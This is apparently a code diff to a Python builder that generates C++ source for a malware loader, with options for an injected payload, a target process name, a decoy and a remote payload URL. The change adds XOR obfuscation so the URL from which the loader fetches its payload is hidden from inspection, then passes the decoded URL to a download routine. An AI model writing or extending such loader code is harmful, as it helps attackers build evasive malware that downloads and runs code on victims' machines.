@@ -2,8 +2,8 @@ import os
 import time
 from Cast.encryptor import *
 
-def build (Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy, Control_String):
-    f = open (f"{build_folder}\\main.cpp", "a")
+def build (Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy, Control_String, xor_key):
+    f = open (f"{build_folder}\\main.cpp", "a", encoding="utf-8")
     f.write(f"""
 #include <iostream>
 #include <string>
@@ -37,6 +37,31 @@ def build (Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Lo
         f.write(f"""\n
 {Payload_Str} 
 """)
+    
+    if Url != "null" :
+        f.write(f"""\n
+
+#define XOR_KEY 0x{xor_key:02X}
+                
+LPCSTR decode_url(const unsigned char* obfuscated_url, int length) {{
+    // Allocazione della memoria per la stringa decodificata
+    char* decoded_url = (char*)malloc(length + 1);
+    if (decoded_url == NULL) {{
+        printf("[!] Memory allocation failed.\\n");
+        return NULL;
+    }}
+
+    // Decodifica ogni carattere usando XOR
+    for (int i = 0; i < length; i++) {{
+        decoded_url[i] = obfuscated_url[i] ^ XOR_KEY;
+    }}
+    decoded_url[length] = '\\0'; // Null-terminate the string
+
+    // Ritorna la stringa decodificata come LPCSTR
+    return (LPCSTR)decoded_url;
+}}
+
+""")
         
     f.write(f"""\n
 using namespace std;
@@ -44,7 +69,15 @@ int main()
 {{
     PBYTE pPayloadAddress;
     SIZE_T pPayloadSize;
-    string Url = "{Url}";
+""")
+    
+    if Url != "null":
+        f.write(f"""\n        
+    {Url}
+""")
+    
+    f.write(f"""\n
+    int url_length = sizeof(Url) / sizeof(Url[0]);
     LPWSTR szProcessName = L"{ProcessName}";
     DWORD dwProcessID;
     HANDLE hProcess;
@@ -68,6 +101,11 @@ int main()
     hThread = GetCurrentThread();
     """)
 
+    if Url != "null":
+        f.write(f"""\n
+        LPCSTR decoded_url = decode_url(Url, url_length);
+""")
+
     if Payload != "null":
         f.write(f"""\n
     pPayloadSize = {len(Payload)};
@@ -82,7 +120,7 @@ int main()
 
     if Url != "null":
         f.write(f"""\n
-    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, (PDWORD)&pPayloadSize)){{
+    if(!FetchFileFromURLA(decoded_url, &pPayloadAddress, (PDWORD)&pPayloadSize)){{
         printf("Failed to fetch payload");
         return 0;
     }}
